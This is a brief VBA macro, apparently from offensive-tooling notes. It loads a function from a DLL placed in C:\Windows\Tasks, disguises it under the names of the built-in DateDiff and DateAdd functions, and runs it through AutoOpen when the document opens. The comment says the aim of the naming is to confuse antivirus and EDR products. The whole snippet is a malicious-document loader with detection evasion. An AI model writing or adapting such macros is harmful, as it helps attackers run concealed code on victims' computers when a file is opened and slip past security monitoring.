' Why use DateDiff and DateAdd in naming, they are function allready defined? this confuse AV/EDR, naming still count in clear script like VBA

Declare Function DateDiff Lib "C:\Windows\Tasks\DateFunc.dll" Alias "DateAdd" () As Integer

Sub AutoOpen()
  res = DateDiff()
End Sub
